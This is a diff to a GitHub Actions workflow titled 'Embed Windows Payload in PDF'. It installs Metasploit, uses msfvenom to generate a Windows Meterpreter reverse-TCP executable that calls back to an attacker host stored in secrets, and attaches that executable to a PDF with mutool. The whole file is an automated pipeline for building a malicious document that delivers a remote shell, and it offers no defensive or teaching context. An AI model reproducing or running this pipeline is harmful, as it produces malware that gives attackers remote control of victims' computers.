@@ -1,4 +1,4 @@
-name: Embed Windows Payload in PDF (Docker Metasploit)
+name: Embed Windows Payload in PDF
 
 on: [workflow_dispatch]
 
@@ -12,10 +12,15 @@ jobs:
       - name: Install mupdf-tools
         run: sudo apt-get update && sudo apt-get install -y mupdf-tools
 
-      - name: Generate Windows payload with Metasploit Docker
+      - name: Install Metasploit Framework
         run: |
-          docker run --rm -v $PWD:/data metasploitframework/metasploit-framework \
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST="${{ secrets.LHOST }}" LPORT="${{ secrets.LPORT }}" -f exe -o /data/shell.exe
+          curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+          chmod 755 msfinstall
+          ./msfinstall
+
+      - name: Generate Windows payload with msfvenom
+        run: |
+          msfvenom -p windows/meterpreter/reverse_tcp LHOST="${{ secrets.LHOST }}" LPORT="${{ secrets.LPORT }}" -f exe -o shell.exe
 
       - name: Embed payload in PDF
         run: mutool attach template.pdf payload.pdf shell.exe
